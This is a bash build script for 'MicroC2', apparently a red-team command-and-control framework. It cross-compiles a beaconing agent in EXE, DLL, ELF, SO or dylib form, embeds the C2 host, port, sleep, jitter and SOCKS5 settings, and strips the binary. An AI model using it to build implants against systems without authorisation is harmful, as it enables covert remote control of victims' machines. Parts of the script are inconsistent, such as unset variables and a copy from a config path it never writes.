#!/bin/bash

echo "MicroC2 Agent Builder"
echo "============================="

# Parse command line arguments
TARGET=""
OUTPUT_DIR=""
BUILD_TYPE="release"
LISTENER_HOST=""
LISTENER_PORT=""
SLEEP_INTERVAL=60
JITTER=2
FORMAT=""
PAYLOAD_ID=""   # New variable to accept server-generated UUID

# Parse command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    --output)
      OUTPUT_DIR="$2"
      shift 2
      ;;
    --build-type)
      BUILD_TYPE="$2"
      shift 2
      ;;
    --format)
      FORMAT="$2"
      shift 2
      ;;
    --listener-host)
      LISTENER_HOST="$2"
      shift 2
      ;;
    --listener-port)
      LISTENER_PORT="$2"
      shift 2
      ;;
    --sleep)
      SLEEP_INTERVAL="$2"
      shift 2
      ;;
    --jitter)
      JITTER="$2"
      shift 2
      ;;
    --payload-id)
      PAYLOAD_ID="$2"
      shift 2
      ;;   # New case for payload ID
    *)
      echo "Unknown option: $1"
      shift
      ;;
  esac
done

# Validate required flags
if [ -z "$LISTENER_HOST" ] || [ -z "$LISTENER_PORT" ]; then
  echo "Error: --listener-host and --listener-port are required" >&2
  exit 1
fi

# Use environment variables if arguments not provided
if [ -z "$TARGET" ]; then
    TARGET=${TARGET:-"x86_64-unknown-linux-gnu"}
fi

# IMPORTANT: Properly set server address and port
if [ -z "$LISTENER_HOST" ]; then
    # Get primary interface IP, but don't use 0.0.0.0 as it's not routable
    DEFAULT_IP=$(ip route get 1 | awk '{print $7;exit}')
    # If the IP is 0.0.0.0 or empty, fall back to 127.0.0.1
    if [ -z "$DEFAULT_IP" ] || [ "$DEFAULT_IP" == "0.0.0.0" ]; then
        DEFAULT_IP="127.0.0.1"
    fi
    SERVER_IP=${LISTENER_HOST:-$DEFAULT_IP}
else
    SERVER_IP=$LISTENER_HOST
fi

# Use provided port or default to listener config port
SERVER_PORT=${LISTENER_PORT:-8443}

# Store original output dir (as provided by the server)
ORIGINAL_OUTPUT_DIR="$OUTPUT_DIR"

# Handle relative/absolute paths
if [[ "$OUTPUT_DIR" != /* ]]; then
    # If relative path, make it absolute from current directory
    OUTPUT_DIR="$(pwd)/$OUTPUT_DIR"
fi

# Determine payload ID if not provided
if [ -z "$PAYLOAD_ID" ]; then
    PAYLOAD_ID=$(basename "$OUTPUT_DIR")
    echo "Detected Payload ID: $PAYLOAD_ID"
else
    echo "Using provided payload ID: $PAYLOAD_ID"
fi

# Also figure out the server's full path
SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
echo "Server path: $SERVER_DIR"

echo "Configuration:"
echo "  Target:       $TARGET"
echo "  Output Dir:   $OUTPUT_DIR"
echo "  Original Dir: $ORIGINAL_OUTPUT_DIR"
echo "  Server Dir:   $SERVER_DIR"
echo "  Build Type:   $BUILD_TYPE"
echo "  C2 Server:    ${SERVER_IP}:${SERVER_PORT}"
echo "  Sleep:        ${SLEEP_INTERVAL:-60} seconds"
echo "  Jitter:       ${JITTER:-2} seconds"
if [ -n "$FORMAT" ]; then
    echo "  Format:       ${FORMAT}"
fi

echo "Checking dependencies..."

# Install required packages if not present
if ! dpkg -l | grep -q "gcc-mingw-w64"; then
    echo "Installing gcc-mingw-w64..."
    sudo apt-get install -y gcc-mingw-w64
fi

# Install cross if not already installed
if ! command -v cross &> /dev/null; then
    echo "Installing cross..."
    cargo install cross
fi

# Generate agent config only in the payload output directory
mkdir -p "$OUTPUT_DIR/.config"
cat > "$OUTPUT_DIR/.config/config.json" << EOF
{
    "server_url": "${SERVER_IP}:${SERVER_PORT}",
    "sleep_interval": ${SLEEP_INTERVAL:-60},
    "jitter": ${JITTER:-2},
    "payload_id": "${PAYLOAD_ID}",
    "protocol": "${PROTOCOL}",
    "socks5_enabled": ${SOCKS5_ENABLED},
    "socks5_host": "${SOCKS5_HOST}",
    "socks5_port": ${SOCKS5_PORT}
}
EOF

echo "Created configuration for build-time embedding"

echo "Building agent..."

# Determine output extension and artifact name
case "$FORMAT" in
    windows_exe)
        BINARY_EXT=".exe"
        AGENT_OUT="agent.exe"
        ;;
    windows_dll)
        BINARY_EXT=".dll"
        AGENT_OUT="agent.dll"
        ;;
    linux_elf)
        BINARY_EXT=""
        AGENT_OUT="agent"
        ;;
    macos_dylib)
        BINARY_EXT=".dylib"
        AGENT_OUT="libagent.dylib"
        ;;
    linux_so)
        BINARY_EXT=".so"
        AGENT_OUT="libagent.so"
        ;;
    *)
        # Default to Linux ELF
        BINARY_EXT=""
        AGENT_OUT="agent"
        ;;
esac

# Set cargo features only for DLL
CARGO_FEATURES=""
if [ "$FORMAT" == "windows_dll" ]; then
    CARGO_FEATURES="--features dll"
    # .cargo/config.toml for DLL build (already handled above)
fi

# Build the agent
echo "Building for $TARGET ($FORMAT)..."
if [[ "$TARGET" == *windows* ]]; then
    if command -v cross &> /dev/null; then
        LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
        cross build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
    else
        rustup target add $TARGET
        LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
        cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
    fi
else
    LISTENER_HOST="$SERVER_IP" LISTENER_PORT="$SERVER_PORT" SLEEP_INTERVAL="$SLEEP_INTERVAL" PAYLOAD_ID="$PAYLOAD_ID" \
    cargo build $BUILD_FLAGS $CARGO_FEATURES --target $TARGET
fi

# Determine the build directory
if [ "$BUILD_TYPE" == "debug" ]; then
    BUILD_DIR="target/$TARGET/debug"
else
    BUILD_DIR="target/$TARGET/release"
fi

# Print contents of build directory for debugging
if [ -d "$BUILD_DIR" ]; then
    echo "Contents of $BUILD_DIR before copy:" >&2
    ls -la "$BUILD_DIR" >&2
else
    echo "Build directory $BUILD_DIR does not exist!" >&2
fi

# Copy the built artifact to the output directory
if [ -f "$BUILD_DIR/$AGENT_OUT" ]; then
    echo "Copying $AGENT_OUT to output directory: $OUTPUT_DIR/$AGENT_OUT"
    mkdir -p "$OUTPUT_DIR"
    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$AGENT_OUT"
    cp "$BUILD_DIR/$AGENT_OUT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_$AGENT_OUT"
    echo "Agent binary copied successfully to specified output location"
else
    echo "ERROR: agent binary not found at $BUILD_DIR/$AGENT_OUT" >&2
    echo "Contents of $BUILD_DIR:" >&2
    ls -la "$BUILD_DIR" >&2
    exit 1
fi

# Copy config.json for agent
mkdir -p "$OUTPUT_DIR/.config"
cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"

# Also copy to server's expected location
mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
cp "$BUILD_DIR/$AGENT_OUT" "$ORIGINAL_OUTPUT_DIR/$AGENT_OUT"
cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"

# Strip and compress if possible
if [ -f "$OUTPUT_DIR/$AGENT_OUT" ]; then
    echo "Stripping binary..."
    strip "$OUTPUT_DIR/$AGENT_OUT" || true
    # if command -v upx &> /dev/null; then
    #     echo "Compressing binary with upx..."
    #     upx --best --lzma "$OUTPUT_DIR/$AGENT_OUT"
    # fi
fi

# Final output checks
echo "Final output directory contents:"
ls -la "$OUTPUT_DIR"
echo "Server directory contents:"
ls -la "$ORIGINAL_OUTPUT_DIR"

# DLL check
if [ "$FORMAT" == "windows_dll" ]; then
    if [ -f "$OUTPUT_DIR/agent.dll" ]; then
        echo "SUCCESS: agent.dll was found at $OUTPUT_DIR/agent.dll"
        stat -c "File size: %s bytes" "$OUTPUT_DIR/agent.dll"
    else
        echo "ERROR: agent.dll was not found in the output directory"
        exit 1
    fi
fi

echo "Build process completed"
